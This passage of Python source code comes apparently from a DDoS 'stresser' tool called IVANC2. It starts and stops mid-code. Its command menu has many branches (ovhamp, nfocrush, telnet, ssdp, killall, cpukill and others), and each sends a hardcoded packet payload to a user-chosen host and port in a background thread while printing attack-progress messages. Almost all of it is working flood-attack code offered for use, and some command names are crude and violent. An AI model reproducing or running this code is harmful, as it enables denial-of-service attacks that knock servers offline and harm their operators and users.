					payload = b"\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee....")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[85m[IVANC2] Attack is Continuing Wait a Few Minutes")
					time.sleep(3)
					print(attacked)
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "nfonull":
			try:
				if running >= 20000:
					print("\033[85mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee....")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[85m[IVANC2] Attack is Continuing Wait a Few Minutes")
					time.sleep(3)
					print(attacked)
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "nfoovh":
			try:
				if running >= 20000:
					print("\033[85mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee....")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[85m[IVANC2] Attack is Continuing Wait a Few Minutes")
					time.sleep(3)
					print(attacked)
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "ovhnat":
			try:
				if running >= 20000:
					print("\033[85mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee....")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[85m[IVANC2] Attack is Continuing Wait a Few Minutes")
					time.sleep(3)
					print(attacked)
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "ovhamp":
			try:
				if running >= 20000:
					print("\033[85mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\xff\xff\xff\xffTSource Engine Query\x00"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee....")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[85m[IVANC2] Attack is Continuing Wait a Few Minutes")
					time.sleep(3)
					print(attacked)
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "nfocrush":
			try:
				if running >= 20000:
					print("\033[85mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\xff\xff\xff\xffTSource Engine Query\x00"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee....")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[85m[IVANC2] Attack is Continuing Wait a Few Minutes")
					time.sleep(3)
					print(attacked)
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "greeth":
			try:
				if running >= 20000:
					print("\033[85mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\xff\xff\xff\xffTSource Engine Query\x00"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee....")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[85m[IVANC2] Attack is Continuing Wait a Few Minutes")
					time.sleep(3)
					print(attacked)
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "telnet":
			try:
				if running >= 20000:
					print("\033[85mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee....")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[85m[IVANC2] Attack is Continuing Wait a Few Minutes")
					time.sleep(3)
					print(attacked)
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "ovhdown":
			try:
				if running >= 20000:
					print("\033[85mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee....")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[85m[IVANC2] Attack is Continuing Wait a Few Minutes")
					time.sleep(3)
					print(attacked)
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "ovhtcp":
			try:
				if running >= 20000:
					print("\033[85mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee....")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[85m[IVANC2] Attack is Continuing Wait a Few Minutes")
					time.sleep(3)
					print(attacked)
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "ovhstresser":
			try:
				if running >= 20000:
					print("\033[85mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee....")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[85m[IVANC2] Attack is Continuing Wait a Few Minutes")
					time.sleep(3)
					print(attacked)
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "ssdp":
			try:
				if running >= 20000:
					print("\033[85mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee....")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[85m[IVANC2] Attack is Continuing Wait a Few Minutes")
					time.sleep(3)
					print(attacked)
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "ovh-sas":
			try:
				if running >= 20000:
					print("\033[85mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee....")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[85m[IVANC2] Attack is Continuing Wait a Few Minutes")
					time.sleep(3)
					print(attacked)
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "hydrakiller":
			try:
				if running >= 20000:
					print("\033[85mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee....")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[85m[IVANC2] Attack is Continuing Wait a Few Minutes")
					time.sleep(3)
					print(attacked)
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "killall":
			try:
				if running >= 20000:
					print("\033[85mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x00\x02\x00\x2f"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee....")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[85m[IVANC2] Attack is Continuing Wait a Few Minutes")
					time.sleep(3)
					print(attacked)
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "cpukill":
			try:
				if running >= 20000:
					print("\033[85mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee....")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[85m[IVANC2] Attack is Continuing Wait a Few Minutes")
					time.sleep(3)
					print(attacked)
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "tcprape":
			try:
				if running >= 20000:
					print("\033[85mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee....")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[85m[IVANC2] Attack is Continuing Wait a Few Minutes")
					time.sleep(3)
					print(attacked)
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "nforape":
			try:
				if running >= 20000:
					print("\033[85mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\xff\xff\xff\xff\x67\x65\x74\x63\x68\x61\x6c\x6c\x65\x6e\x67\x65\x20\x30\x20\x22"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee....")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
